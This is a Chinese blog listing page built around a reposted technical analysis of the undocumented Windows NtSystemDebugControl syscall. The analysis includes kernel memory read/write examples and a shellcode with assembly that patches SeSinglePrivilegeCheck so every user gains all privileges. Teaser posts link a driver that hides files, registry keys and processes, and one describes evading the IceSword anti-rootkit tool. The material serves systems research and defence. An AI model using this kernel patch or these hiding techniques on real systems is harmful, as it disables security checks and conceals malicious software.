</span><span class=post-meta-item-text title=分类于>分类于：
</span><span itemprop=about itemscope itemtype=http://schema.org/Thing><a href=/categories/safe/ itemprop=url rel=index><span itemprop=name>dev/Safe</span>
</a></span></span><span class=post-meta-item title=浏览><span class=post-meta-item-icon><i class="fas fa-solid fa-eye"></i>
</span><span class=post-meta-item-text>浏览：
</span><span id=pageview-count data-path=/post/native-api-ntsystemdebugcontrol-analysis/><i class="fa fa-sync fa-spin"></i></span></span></div></div></header><div class=post-body itemprop=articleBody><p>对Native API NtSystemDebugControl的分析<br>文章作者：tombkeeper[0×40]nsfocus[0×2e]com<p>在《获取Windows 系统的内核变量》中，我提及了在Windows NT 5.1以上的系统<br>中存在一个功能强大的 Native API NtSystemDebugControl，下面我们来看看它到底<br>有多强大。<p>NtSystemDebugControl是Windows NT系列操作系统上实现的一个系统调用，在不<br>同系统上的调用号分别为：<p>Windows NT 0xba<br>Windows 2000 0xde<br>Windows XP 0xff<br>Windows 2003 0×108<p>这是一个未文档化的 API，《Windows NT/2000 Native API Reference》中有相<br>关介绍。官方定义可以在一个微软的private头文件ntexapi.h中找到。该文件中还包<br>含很多其它内部数据结构。可能Windows NT 4的SDK中还曾经有过这个文件（至少NT4<br>ResourceKit的支持文档里面是这样说的），但现在似乎微软只提供给它的合作伙伴。<br>好在NTKernel新闻组上有一个“very kind person”共享了这个头文件，你可以从参<br>考资源[2]的两个链接中得到它。<p>这就是ntexapi.h中的定义：<p>typedef enum _SYSDBG_COMMAND {<br>SysDbgQueryTraceInformation = 1, //KdGetTraceInformation()<br>SysDbgSetTracepoint = 2, //KdSetInternalBreakpoint()<br>SysDbgSetSpecialCall = 3, //KdSetSpecialCall()<br>SysDbgClearSpecialCalls = 4, //KdClearSpecialCalls()<br>SysDbgQuerySpecialCalls = 5, //KdQuerySpecialCalls()<br>SysDbgQueryModuleInformation //ntexapi.h中有，但实际上未实现<br>} SYSDBG_COMMAND, *PSYSDBG_COMMAND;<p>NTSYSAPI<br>NTSTATUS<br>NTAPI<br>NtSystemDebugControl (<br>IN SYSDBG_COMMAND Command,<br>IN PVOID InputBuffer,<br>IN ULONG InputBufferLength,<br>OUT PVOID OutputBuffer,<br>IN ULONG OutputBufferLength,<br>OUT PULONG ReturnLength<br>);<p>从上面可以看出，Windows NT和Windows 2000上的NtSystemDebugControl通过不<br>同的第一形参可调用五个内核函数，实现相关功能。<p>NtSystemDebugControl在Windows NT和Windows 2000上的功能还是比较简陋的，<br>《Windows NT/2000 Native API Reference》一书对这些已经介绍的很详细了，本文<br>不再赘述。<p>从Windows NT 5.1内核（Windows XP）开始，NtSystemDebugControl的功能被极<br>大扩增了。根据逆向工程的结果来看，在Windows XP上NtSystemDebugControl的第一<br>形参可接受 20个不同的功能调用，在Windows 2003上则有28个。<p>关于NtSystemDebugControl在Windows NT 5.1以上的实现，互联网上唯一能找到<br>的资料是BUGTRAQ ID 9694关于该 API的一个漏洞报告（参考资源[1]），事实上，这<br>个所谓漏洞是不能称之为漏洞的，因为调用这个API需要SeDebugPrivilege 特权，普<br>通用户根本执行不了，也就谈不上权限提升。<p>下面的enum是我逆向工程的结果，绝大部分经过测试：<p>typedef enum _SYSDBG_COMMAND {<br>//以下5个在Windows NT各个版本上都有<br>SysDbgGetTraceInformation = 1,<br>SysDbgSetInternalBreakpoint = 2,<br>SysDbgSetSpecialCall = 3,<br>SysDbgClearSpecialCalls = 4,<br>SysDbgQuerySpecialCalls = 5,<p>// 以下是NT 5.1 新增的<br>SysDbgDbgBreakPointWithStatus = 6,<p>//获取KdVersionBlock<br>SysDbgSysGetVersion = 7,<p>//从内核空间拷贝到用户空间，或者从用户空间拷贝到用户空间<br>//但是不能从用户空间拷贝到内核空间<br>SysDbgCopyMemoryChunks_0 = 8,<br>//SysDbgReadVirtualMemory = 8,<p>//从用户空间拷贝到内核空间，或者从用户空间拷贝到用户空间<br>//但是不能从内核空间拷贝到用户空间<br>SysDbgCopyMemoryChunks_1 = 9,<br>//SysDbgWriteVirtualMemory = 9,<p>//从物理地址拷贝到用户空间，不能写到内核空间<br>SysDbgCopyMemoryChunks_2 = 10,<br>//SysDbgReadVirtualMemory = 10,<p>//从用户空间拷贝到物理地址，不能读取内核空间<br>SysDbgCopyMemoryChunks_3 = 11,<br>//SysDbgWriteVirtualMemory = 11,<p>//读写处理器相关控制块<br>SysDbgSysReadControlSpace = 12,<br>SysDbgSysWriteControlSpace = 13,<p>//读写端口<br>SysDbgSysReadIoSpace = 14,<br>SysDbgSysWriteIoSpace = 15,<p>//分别调用RDMSR@4和_WRMSR@12<br>SysDbgSysReadMsr = 16,<br>SysDbgSysWriteMsr = 17,<p>//读写总线数据<br>SysDbgSysReadBusData = 18,<br>SysDbgSysWriteBusData = 19,<p>SysDbgSysCheckLowMemory = 20,<p>// 以下是NT 5.2 新增的<p>//分别调用_KdEnableDebugger@0和_KdDisableDebugger@0<br>SysDbgEnableDebugger = 21,<br>SysDbgDisableDebugger = 22,<p>//获取和设置一些调试相关的变量<br>SysDbgGetAutoEnableOnEvent = 23,<br>SysDbgSetAutoEnableOnEvent = 24,<br>SysDbgGetPitchDebugger = 25,<br>SysDbgSetDbgPrintBufferSize = 26,<br>SysDbgGetIgnoreUmExceptions = 27,<br>SysDbgSetIgnoreUmExceptions = 28<br>} SYSDBG_COMMAND, *PSYSDBG_COMMAND;<p>从上面可以看出，在Windows NT 5.1以上的NtSystemDebugControl可以实现读写<br>内核线性空间数据、读写物理内存、读写端口、读写总线数据、读写MSR 等功能；在<br>Windows NT 5.2以上还可以在系统运行状态下使能、禁用内核调试以及获取、设置一<br>些相关变量等。<p>显然，从Windows XP开始，我们再次获得了MS DOS时代直接操纵系统的权杖，戴<br>着桂冠，重新回到了奥林匹斯山之巅。<p>下面举几个具体应用的例子。<p>例子1：<p>下面代码演示读取KdVersionBlock：<p>//————————————————————————<br>typedef struct _DBGKD_GET_VERSION64 {<br>USHORT MajorVersion;<br>USHORT MinorVersion;<br>USHORT ProtocolVersion;<br>USHORT Flags;<br>USHORT MachineType;<br>UCHAR MaxPacketType;<br>UCHAR MaxStateChange;<br>UCHAR MaxManipulate;<br>UCHAR Simulation;<br>USHORT Unused[1];<br>ULONG64 KernBase;<br>ULONG64 PsLoadedModuleList;<br>ULONG64 DebuggerDataList;<br>} DBGKD_GET_VERSION64, *PDBGKD_GET_VERSION64;<p>DBGKD_GET_VERSION64 KdVersionBlock;<p>EnablePrivilege(SE_DEBUG_NAME);<p>ZwSystemDebugControl<br>(<br>SysDbgSysGetVersion,<br>NULL,<br>0,<br>&amp;KdVersionBlock,<br>sizeof(KdVersionBlock), //必须是0×28<br>NULL<br>);<p>printf (”KernBase: 0x%.8x\n”,KdVersionBlock.KernBase);<br>printf (”PsLoadedModuleList: 0x%.8x\n”,KdVersionBlock.PsLoadedModuleList);<br>printf (”DebuggerDataList: 0x%.8x\n”,KdVersionBlock.DebuggerDataList);<br>//————————————————————————<p>例子2：<p>下面代码演示读取内核空间数据的操作，这里读取的是Windows 2003内核映像的<br>头两个字节，也就是“MZ”。<p>//————————————————————————<br>typedef struct _MEMORY_CHUNKS {<br>ULONG Address;<br>PVOID Data;<br>ULONG Length;<br>}MEMORY_CHUNKS, *PMEMORY_CHUNKS;<p>MEMORY_CHUNKS QueryBuff;<br>ULONG ReturnLength;<br>char Buff[0×2] = {0};<p>QueryBuff.Address = 0×804e0000; //Windows 2003的KernBase<br>QueryBuff.Data = Buff; //在此是读出缓冲<br>QueryBuff.Length = sizeof(Buff);<p>EnablePrivilege(SE_DEBUG_NAME);<p>ZwSystemDebugControl<br>(<br>SysDbgCopyMemoryChunks_0,<br>&amp;QueryBuff,<br>sizeof(MEMORY_CHUNKS), //必须是0×0C<br>NULL,<br>0,<br>&amp;ReturnLength<br>);<p>printf (”\”MZ\”: %s\n”,Buff);<br>//————————————————————————<p>例子3：<p>下面是一个使用NtSystemDebugControl的SysDbgCopyMemoryChunks_1功能实现的<br>Patch内核的ShellCode，把0×80580e66由原来的8a450c改为90b001：<p>修改前：<p>nt!SeSinglePrivilegeCheck+0×5c:<br>80580e66 8a450c mov al,[ebp+0xc]<br>80580e69 c9 leave<br>80580e6a c20c00 ret 0xc<p>修改后：<br>nt!SeSinglePrivilegeCheck+0×5c:<br>80580e66 90 nop<br>80580e67 b001 mov al,0×1<br>80580e69 c9 leave<br>80580e6a c20c00 ret 0xc<p>这样，SeSinglePrivilegeCheck总是返回True，也就是说，无论哪个用户，总是<br>拥有全部系统特权。<p>\xeb\x09\x66\xb8\x08\x01\x8b\xd4\x0f\x34\xc3\x68\x90\xb0\x01\xc9<br>\x8b\xc4\x6a\x04\x50\x68\x66\x0e\x58\x80\x54\x5b\x33\xc0\x50\x54<br>\x50\x50\x6a\x0c\x53\x6a\x09\x50\xe8\xd5\xff\xff\xff\x83<p>//————————————————————————<br>#pragma comment(linker, “/entry:main /ALIGN:4096″ )<br>#pragma comment(lib, “kernel32.lib”)<p>#define sysenter __asm __emit 0×0f __asm __emit 0×34<p>void main(void)<br>{<br>__asm<br>{<br>int 3 //debug<br>jmp patch<p>SystemDebugControl:<p>mov ax,0×108<br>mov edx,esp<br>sysenter<br>ret<p>patch:<p>push 0xc901b090<br>mov eax,esp<br>push 0×04<br>push eax<br>push 0×80580e66<br>push esp<br>pop ebx<br>xor eax,eax<br>push eax<br>push esp //ReturnLength<br>push eax //OutputBufferLength<br>push eax //OutputBuffer<br>push 0×0c //InputBufferLength<br>push ebx //InputBuffer<br>push 0×09 //ControlCode<br>push eax //for sysenter ret<br>call SystemDebugControl<br>add esp,0×30 //只是为了修正堆栈<br>}<br>}<br>//————————————————————————<p>上面只是一个概念代码，使用的Patch地址是固定的，对5.2.3790.0 版本的内核<br>有效。由于调用NtSystemDebugControl 要SeDebugPrivilege，所以这段ShellCode需<br>要在LocalSystem 的身份的进程空间运行，或者自己增加SeDebugPrivilege。最简单<br>的办法就是在WinDBG中执行。<p>例子4：<p>下面是一段完整的代码，利用NtSystemDebugControl读写端口的能力，直接操纵<br>PC Speaker发声：<p>//————————————————————————<br>//演示用ZwSystemDebugControl读写端口使PC Speaker发声<br>//tombkeeper 2004.08.03<p>#include<br>#include<p>#pragma comment(lib, “advapi32″)<p>#define NTAPI __stdcall<br>#define FCHK(a) if (!(a)) {printf(#a ” failed\n”); return 0;}<p>typedef int NTSTATUS;<p>typedef enum _SYSDBG_COMMAND<br>{<br>SysDbgSysReadIoSpace = 14,<br>SysDbgSysWriteIoSpace = 15<br>}SYSDBG_COMMAND, *PSYSDBG_COMMAND;<p>typedef NTSTATUS (NTAPI * PZwSystemDebugControl) (<br>SYSDBG_COMMAND ControlCode,<br>PVOID InputBuffer,<br>ULONG InputBufferLength,<br>PVOID OutputBuffer,<br>ULONG OutputBufferLength,<br>PULONG ReturnLength<br>);<p>PZwSystemDebugControl ZwSystemDebugControl = NULL;<p>typedef struct _IO_STRUCT<br>{<br>DWORD IoAddr; // IN: Aligned to NumBYTEs,I/O address<br>DWORD Reserved1; // Never accessed by the kernel<br>PVOID pBuffer; // IN (write) or OUT (read): Ptr to buffer<br>DWORD NumBYTEs; // IN: # BYTEs to read/write. Only use 1, 2, or 4.<br>DWORD Reserved4; // Must be 1<br>DWORD Reserved5; // Must be 0<br>DWORD Reserved6; // Must be 1<br>DWORD Reserved7; // Never accessed by the kernel<br>}<br>IO_STRUCT, *PIO_STRUCT;<p>BOOL EnablePrivilege (PCSTR name)<br>{<br>HANDLE hToken;<br>BOOL rv;<p>TOKEN_PRIVILEGES priv = { 1, {0, 0, SE_PRIVILEGE_ENABLED} };<br>LookupPrivilegeValue (<br>0,<br>name,<br>&amp;priv.Privileges[0].Luid<br>);<p>OpenProcessToken(<br>GetCurrentProcess (),<br>TOKEN_ADJUST_PRIVILEGES,<br>&amp;hToken<br>);<p>AdjustTokenPrivileges (<br>hToken,<br>FALSE,<br>&amp;priv,<br>sizeof priv,<br>0,<br>0<br>);<br>rv = GetLastError () == ERROR_SUCCESS;<p>CloseHandle (hToken);<br>return rv;<br>}<p>BYTE InPortB (int Port)<br>{<br>BYTE Value;<br>IO_STRUCT io;<p>io.IoAddr = Port;<br>io.Reserved1 = 0;<br>io.pBuffer = (PVOID) (PULONG) & Value;<br>io.NumBYTEs = sizeof (BYTE);<br>io.Reserved4 = 1;<br>io.Reserved5 = 0;<br>io.Reserved6 = 1;<br>io.Reserved7 = 0;<p>ZwSystemDebugControl<br>(<br>SysDbgSysReadIoSpace,<br>&amp;io,<br>sizeof (io),<br>NULL,<br>0,<br>NULL<br>);<br>return Value;<br>}<p>void OutPortB (int Port, BYTE Value)<br>{<br>IO_STRUCT io;<p>io.IoAddr = Port;<br>io.Reserved1 = 0;<br>io.pBuffer = (PVOID) (PULONG) & Value;<br>io.NumBYTEs = sizeof (BYTE);<br>io.Reserved4 = 1;<br>io.Reserved5 = 0;<br>io.Reserved6 = 1;<br>io.Reserved7 = 0;<p>ZwSystemDebugControl<br>(<br>SysDbgSysWriteIoSpace,<br>&amp;io,<br>sizeof (io),<br>NULL,<br>0,<br>NULL<br>);<br>};<p>void BeepOn (int Freq)<br>{<br>BYTE b;<p>if ((Freq >= 20) && (Freq &lt;= 20000))<br>{<br>Freq = 1193181 / Freq;<br>b = InPortB (0x61);<br>if ((b & 3) == 0)<br>{<br>OutPortB (0x61, (BYTE) (b | 3));<br>OutPortB (0x43, 0xb6);<br>}<br>OutPortB (0x42, (BYTE) Freq);<br>OutPortB (0x42, (BYTE) (Freq >> 8));<br>}<br>}<p>void BeepOff (void)<br>{<br>BYTE b;<p>b = (InPortB (0×61) & 0xfc);<br>OutPortB (0×61, b);<br>}<p>int main (void)<br>{<br>HMODULE hNtdll;<br>ULONG ReturnLength;<br>OSVERSIONINFO OSVersionInfo;<br>OSVersionInfo.dwOSVersionInfoSize = sizeof (OSVERSIONINFO);<p>EnablePrivilege (SE_DEBUG_NAME);<p>FCHK ((hNtdll = LoadLibrary (”ntdll.dll”)) != NULL);<br>FCHK ((ZwSystemDebugControl = (PZwSystemDebugControl)<br>GetProcAddress (hNtdll, “ZwSystemDebugControl”)) != NULL);<br>FCHK ((void *) GetVersionEx (&amp;OSVersionInfo) != NULL);<p>if (OSVersionInfo.dwPlatformId == VER_PLATFORM_WIN32_NT &&<br>OSVersionInfo.dwMajorVersion >= 5 &&<br>OSVersionInfo.dwMinorVersion >= 1) //Windows XP以上<br>{<br>BeepOn (1000); //声音频率1000Hz<br>Sleep (1000);<br>BeepOff ();<br>}<br>else<br>{<br>printf (”This program require Windows XP or Windows 2003.\n”);<br>}<br>return 0;<br>}<br>//————————————————————————<p>参考资源：<p>[1]Microsoft Windows NtSystemDebugControl() Kernel API Function Privilege<br>Escalation Vulnerability<br>http://www.securityfocus.com/bid/9694<p>[2]ntexapi.h<br>http://www.codeguru.com/code/legacy/system/ntexapi.zip<br>http://void.ru/files/Ntexapi.h</p></div><footer class=post-footer><div class=post-button><a class=btn href=/post/native-api-ntsystemdebugcontrol-analysis/#more rel=contents>阅读全文 &#187;</a></div><div class=post-eof></div></footer></article></div><div class=post-block><article itemscope itemtype=http://schema.org/Article class=post-content lang><link itemprop=mainEntityOfPage href=https://blogs.qipai360.cn/post/driver-level-hide-files-registry-processes/><span hidden itemprop=author itemscope itemtype=http://schema.org/Person><meta itemprop=image content="/imgs/avatar.jpg"><meta itemprop=name content="Rise"></span><span hidden itemprop=publisher itemscope itemtype=http://schema.org/Organization><meta itemprop=name content="Rise"><meta itemprop=description content="福兮祸兮，焉知所依？冬去冰泮，春来萌荣。朝生暮死，亦可惊鸿。知足者富，自足者强。"></span><span hidden itemprop=post itemscope itemtype=http://schema.org/CreativeWork><meta itemprop=name content="驱动级隐藏文件,注册表,进程"><meta itemprop=description content="驱动级隐藏文件,注册表,进程 驱动程序暂不提供源码!提供接口方便调用. 别的不说了，看代码。 &nbsp; &nbsp; 点击下载"></span><header class=post-header><h2 class=post-title itemprop="name headline"><a href=/post/driver-level-hide-files-registry-processes/ itemprop=url class=post-title-link>驱动级隐藏文件,注册表,进程</a></h2><div class=post-meta-container><div class=post-meta-items><span class=post-meta-item><span class=post-meta-item-icon><i class="fas fa-solid fa-calendar"></i>
</span><span class=post-meta-item-text title=发表于>发表于：
</span><time title="创建时间：2008年03月29日 11:59:00 CST" itemprop="dateCreated datePublished" datetime="2008-03-29 11:59:00 +0800 +0800">2008年03月29日
</time></span><span class=post-meta-item><span class=post-meta-item-icon><i class="fas fa-solid fa-folder-open"></i>
</span><span class=post-meta-item-text title=分类于>分类于：
</span><span itemprop=about itemscope itemtype=http://schema.org/Thing><a href=/categories/safe/ itemprop=url rel=index><span itemprop=name>dev/Safe</span>
</a></span></span><span class=post-meta-item title=浏览><span class=post-meta-item-icon><i class="fas fa-solid fa-eye"></i>
</span><span class=post-meta-item-text>浏览：
</span><span id=pageview-count data-path=/post/driver-level-hide-files-registry-processes/><i class="fa fa-sync fa-spin"></i></span></span></div></div></header><div class=post-body itemprop=articleBody><p>驱动级隐藏文件,注册表,进程</p><p>驱动程序暂不提供源码!<br>提供接口方便调用.</p><p>别的不说了，看代码。</p><p>&nbsp;</p><p>&nbsp;</p><p><a title=点击下载 href=http://www.cnxct.com/attachments/month_200612/12_155223_1xp5tfilter.rar>点击下载</a></p></div><footer class=post-footer><div class=post-button><a class=btn href=/post/driver-level-hide-files-registry-processes/#more rel=contents>阅读全文 &#187;</a></div><div class=post-eof></div></footer></article></div><div class=post-block><article itemscope itemtype=http://schema.org/Article class=post-content lang><link itemprop=mainEntityOfPage href=https://blogs.qipai360.cn/post/hidden-registry-driver-code-bypass-icesword/><span hidden itemprop=author itemscope itemtype=http://schema.org/Person><meta itemprop=image content="/imgs/avatar.jpg"><meta itemprop=name content="Rise"></span><span hidden itemprop=publisher itemscope itemtype=http://schema.org/Organization><meta itemprop=name content="Rise"><meta itemprop=description content="福兮祸兮，焉知所依？冬去冰泮，春来萌荣。朝生暮死，亦可惊鸿。知足者富，自足者强。"></span><span hidden itemprop=post itemscope itemtype=http://schema.org/CreativeWork><meta itemprop=name content="发一段隐藏注册表项的驱动代码，可以过目前最新的IceSword1.22"><meta itemprop=description content="以前驱动开发网悬赏挑战IceSword时写的，不过最后没公开。那时流氓软件势头正劲，我可不想火上浇油。现在反流氓软件日渐成熟，也就没关系了。知道了原理，防御是非常容易的。"></span><header class=post-header><h2 class=post-title itemprop="name headline"><a href=/post/hidden-registry-driver-code-bypass-icesword/ itemprop=url class=post-title-link>发一段隐藏注册表项的驱动代码，可以过目前最新的IceSword1.22</a></h2><div class=post-meta-container><div class=post-meta-items><span class=post-meta-item><span class=post-meta-item-icon><i class="fas fa-solid fa-calendar"></i>
</span><span class=post-meta-item-text title=发表于>发表于：
</span><time title="创建时间：2008年03月29日 11:48:00 CST" itemprop="dateCreated datePublished" datetime="2008-03-29 11:48:00 +0800 +0800">2008年03月29日
</time></span><span class=post-meta-item><span class=post-meta-item-icon><i class="fas fa-solid fa-calendar-check"></i>
</span><span class=post-meta-item-text title=更新于>更新于：
</span><time title="修改时间：2008年03月29日 11:50:00 CST" itemprop="dateModified dateLastmod" datetime="2008-03-29 11:50:00 +0800 +0800">2008年03月29日
</time></span><span class=post-meta-item><span class=post-meta-item-icon><i class="fas fa-solid fa-folder-open"></i>
</span><span class=post-meta-item-text title=分类于>分类于：
</span><span itemprop=about itemscope itemtype=http://schema.org/Thing><a href=/categories/safe/ itemprop=url rel=index><span itemprop=name>dev/Safe</span>
</a></span></span><span class=post-meta-item title=浏览><span class=post-meta-item-icon><i class="fas fa-solid fa-eye"></i>
</span><span class=post-meta-item-text>浏览：
</span><span id=pageview-count data-path=/post/hidden-registry-driver-code-bypass-icesword/><i class="fa fa-sync fa-spin"></i></span></span></div></div></header><div class=post-body itemprop=articleBody><p>以前驱动开发网悬赏挑战IceSword时写的，不过最后没公开。那时流氓软件势头正劲，我可不想火上浇油。现在反流氓软件日渐成熟，也就没关系了。知道了原理，防御是非常容易的。</p></div><footer class=post-footer><div class=post-button><a class=btn href=/post/hidden-registry-driver-code-bypass-icesword/#more rel=contents>阅读全文 &#187;</a></div><div class=post-eof></div></footer></article></div><div class=post-block><article itemscope itemtype=http://schema.org/Article class=post-content lang><link itemprop=mainEntityOfPage href=https://blogs.qipai360.cn/post/getting-full-path-from-file-handle/><span hidden itemprop=author itemscope itemtype=http://schema.org/Person><meta itemprop=image content="/imgs/avatar.jpg"><meta itemprop=name content="Rise"></span><span hidden itemprop=publisher itemscope itemtype=http://schema.org/Organization><meta itemprop=name content="Rise"><meta itemprop=description content="福兮祸兮，焉知所依？冬去冰泮，春来萌荣。朝生暮死，亦可惊鸿。知足者富，自足者强。"></span><span hidden itemprop=post itemscope itemtype=http://schema.org/CreativeWork><meta itemprop=name content="从文件句柄获得全路径"><meta itemprop=description content="从文件句柄获得全路径这个问题，似乎是个“老大难”问题。
很久以前我就在水木清华见到过。最近又不断有人提到。
其实问题并不难，只是解决办法有点绕，不是调用一个API就能解决的。"></span><header class=post-header><h2 class=post-title itemprop="name headline"><a href=/post/getting-full-path-from-file-handle/ itemprop=url class=post-title-link>从文件句柄获得全路径</a></h2><div class=post-meta-container><div class=post-meta-items><span class=post-meta-item><span class=post-meta-item-icon><i class="fas fa-solid fa-calendar"></i>
</span><span class=post-meta-item-text title=发表于>发表于：
</span><time title="创建时间：2008年03月29日 11:42:00 CST" itemprop="dateCreated datePublished" datetime="2008-03-29 11:42:00 +0800 +0800">2008年03月29日
</time></span><span class=post-meta-item><span class=post-meta-item-icon><i class="fas fa-solid fa-calendar-check"></i>
</span><span class=post-meta-item-text title=更新于>更新于：
</span><time title="修改时间：2008年03月29日 11:50:00 CST" itemprop="dateModified dateLastmod" datetime="2008-03-29 11:50:00 +0800 +0800">2008年03月29日
</time></span><span class=post-meta-item><span class=post-meta-item-icon><i class="fas fa-solid fa-folder-open"></i>
</span><span class=post-meta-item-text title=分类于>分类于：
</span><span itemprop=about itemscope itemtype=http://schema.org/Thing><a href=/categories/safe/ itemprop=url rel=index><span itemprop=name>dev/Safe</span>
</a></span></span><span class=post-meta-item title=浏览><span class=post-meta-item-icon><i class="fas fa-solid fa-eye"></i>
</span><span class=post-meta-item-text>浏览：
</span><span id=pageview-count data-path=/post/getting-full-path-from-file-handle/><i class="fa fa-sync fa-spin"></i></span></span></div></div></header><div class=post-body itemprop=articleBody><p>从文件句柄获得全路径这个问题，似乎是个“老大难”问题。<br>很久以前我就在水木清华见到过。最近又不断有人提到。<br>其实问题并不难，只是解决办法有点绕，不是调用一个API就能解决的。</p></div><footer class=post-footer><div class=post-button><a class=btn href=/post/getting-full-path-from-file-handle/#more rel=contents>阅读全文 &#187;</a></div><div class=post-eof></div></footer></article></div><div class=post-block><article itemscope itemtype=http://schema.org/Article class=post-content lang><link itemprop=mainEntityOfPage href=https://blogs.qipai360.cn/post/finally-got-baidu-hi-invitation/><span hidden itemprop=author itemscope itemtype=http://schema.org/Person><meta itemprop=image content="/imgs/avatar.jpg"><meta itemprop=name content="Rise"></span><span hidden itemprop=publisher itemscope itemtype=http://schema.org/Organization><meta itemprop=name content="Rise"><meta itemprop=description content="福兮祸兮，焉知所依？冬去冰泮，春来萌荣。朝生暮死，亦可惊鸿。知足者富，自足者强。"></span><span hidden itemprop=post itemscope itemtype=http://schema.org/CreativeWork><meta itemprop=name content="终于弄到个百度Hi的邀请"><meta itemprop=description content="24号下午百度Hi终于开始了有条件向百度用户开放百度Hi体验。为此，25号重新申请了个百度的账号，跑到百度Hi的官方网站去申请了抢先体验。可是却如石沉大海一般，没有了下文。只得作罢。 但是，始终希望能够体验一下百度Hi与QQ的不同。&#8220;贼&#8221;心不死，今天跑到百度贴吧的Hi吧去看到有已经申请成功大地人可以发送体验邀请，于是抱着试一试的态度回复了一条消息。结果很快就有了回复，给了我个邀请。这样我的百度Hi账号就被激活啦。这让我兴奋了一下下。 按照百度给的地址下载了百度Hi，马上登录了。和QQ对比了一下，给我最大的感觉就是百度Hi很干净。     上图是百度Hi的主窗口      下图是百度Hi的聊天界面。 "></span><header class=post-header><h2 class=post-title itemprop="name headline"><a href=/post/finally-got-baidu-hi-invitation/ itemprop=url class=post-title-link>终于弄到个百度Hi的邀请</a></h2><div class=post-meta-container><div class=post-meta-items><span class=post-meta-item><span class=post-meta-item-icon><i class="fas fa-solid fa-calendar"></i>
</span><span class=post-meta-item-text title=发表于>发表于：
</span><time title="创建时间：2008年03月28日 16:59:00 CST" itemprop="dateCreated datePublished" datetime="2008-03-28 16:59:00 +0800 +0800">2008年03月28日
</time></span><span class=post-meta-item><span class=post-meta-item-icon><i class="fas fa-solid fa-folder-open"></i>
</span><span class=post-meta-item-text title=分类于>分类于：
</span><span itemprop=about itemscope itemtype=http://schema.org/Thing><a href=/categories/capricethink/ itemprop=url rel=index><span itemprop=name>CapriceThink</span>
</a></span></span><span class=post-meta-item title=浏览><span class=post-meta-item-icon><i class="fas fa-solid fa-eye"></i>
</span><span class=post-meta-item-text>浏览：
</span><span id=pageview-count data-path=/post/finally-got-baidu-hi-invitation/><i class="fa fa-sync fa-spin"></i></span></span></div></div></header><div class=post-body itemprop=articleBody><p>24号下午百度Hi终于开始了有条件向百度用户开放百度Hi体验。为此，25号重新申请了个百度的账号，跑到百度Hi的官方网站去申请了抢先体验。可是却如石沉大海一般，没有了下文。只得作罢。 但是，始终希望能够体验一下百度Hi与QQ的不同。&#8220;贼&#8221;心不死，今天跑到百度贴吧的Hi吧去看到有已经申请成功大地人可以发送体验邀请，于是抱着试一试的态度回复了一条消息。结果很快就有了回复，给了我个邀请。这样我的百度Hi账号就被激活啦。这让我兴奋了一下下。 按照百度给的地址下载了百度Hi，马上登录了。和QQ对比了一下，给我最大的感觉就是百度Hi很干净。<br><a href=http://www.cnblogs.com/images/cnblogs_com/flying_bat/WindowsLiveWriter/Hi_EEC0/2e7c6d31ed3458b95edf0ea4_2.jpg><img style=border-right:0;border-top:0;border-left:0;border-bottom:0 height=244 alt=2e7c6d31ed3458b95edf0ea4 src=http://www.cnblogs.com/images/cnblogs_com/flying_bat/WindowsLiveWriter/Hi_EEC0/2e7c6d31ed3458b95edf0ea4_thumb.jpg width=120 border=0></a> 上图是百度Hi的主窗口<br><a href=http://www.cnblogs.com/images/cnblogs_com/flying_bat/WindowsLiveWriter/Hi_EEC0/8188fe2e206df7414fc226a5_2.jpg><img style=border-right:0;border-top:0;border-left:0;border-bottom:0 height=224 alt=8188fe2e206df7414fc226a5 src=http://www.cnblogs.com/images/cnblogs_com/flying_bat/WindowsLiveWriter/Hi_EEC0/8188fe2e206df7414fc226a5_thumb.jpg width=244 border=0></a> 下图是百度Hi的聊天界面。</p></div><footer class=post-footer><div class=post-button><a class=btn href=/post/finally-got-baidu-hi-invitation/#more rel=contents>阅读全文 &#187;</a></div><div class=post-eof></div></footer></article></div><nav class=pagination><a class="extend prev" rel=prev href=/post/page/30/><i class="fa fa-angle-left"></i>
</a><a class=page-number href=/post/page/27/>27</a>
<a class=page-number href=/post/page/28/>28</a>
<a class=page-number href=/post/page/29/>29</a>
<a class=page-number href=/post/page/30/>30</a>
<span class="page-number current">31</span>
<a class=page-number href=/post/page/32/>32</a>
<a class=page-number href=/post/page/33/>33</a>
<a class=page-number href=/post/page/34/>34</a>
<a class=page-number href=/post/page/35/>35</a>
<a class="extend next" rel=next href=/post/page/32/><i class="fa fa-angle-right"></i></a></nav></div></main><footer class=footer><div class=footer-inner><div class=copyright>&copy;
<span itemprop=copyrightYear>2004 - 2026
</span><span class=with-love><i class="fa fa-heart"></i>
</span><span class=author itemprop=copyrightHolder>Rise</span></div><div class=powered-by>由 <a href=https://gohugo.io title=0.157.0 target=_blank>Hugo</a> & <a href=https://github.com/hugo-next/hugo-theme-next title=4.8.3 target=_blank>Hugo NexT.Gemini</a> 强力驱动</div><div class=beian><a href=https://beian.miit.gov.cn target=_blank>豫ICP备2021009490号</a>
<img src=/imgs/gongan.png alt=豫公网安备>
<a href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=41162302000074" target=_blank>豫公网安备 41162302000074 号</a></div></div></footer><script class=next-config data-name=page type=application/json>{"comments":true,"expired":false,"isHome":false,"isPage":false,"path":"post","permalink":"https://blogs.qipai360.cn/post/","title":"Posts","toc":false,"waline3":{"pagecnt":{"alias":"@waline/client","alias_name":"waline","file":"dist/pageview.js","name":"pageview","version":"3.5.7"}}}</script><script type=text/javascript src=https://blogs.qipai360.cn/js/3rd/animejs/3.2.2/anime.min.js crossorigin=anonymous defer></script><script type=text/javascript src=https://blogs.qipai360.cn/js/3rd/viewerjs/1.11.6/viewer.min.js crossorigin=anonymous defer></script><script class=next-config data-name=main type=application/json>{"bookmark":{"color":"#222","enable":true,"save":"manual"},"copybtn":true,"darkmode":true,"giscus":{"cfg":{"category":"Announcements","categoryid":"DIC_kwDOA6L0YM4CiXf9","emit":false,"inputposition":"top","mapping":"title","reactions":false,"repo":"rise-worlds/rise-worlds.github.io","repoid":"MDEwOlJlcG9zaXRvcnk2MTAxMTA0MA==","theme":"transparent_dark"},"js":"https://giscus.app/client.js"},"hostname":"https://blogs.qipai360.cn/","i18n":{"ds_day":" 天前","ds_days":" 天 ","ds_hour":" 小时前","ds_hours":" 小时 ","ds_just":"刚刚","ds_min":" 分钟前","ds_mins":" 分钟","ds_month":" 个月前","ds_years":" 年 ","empty":"没有找到任何搜索结果：${query}","hits":"找到 ${hits} 个搜索结果","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 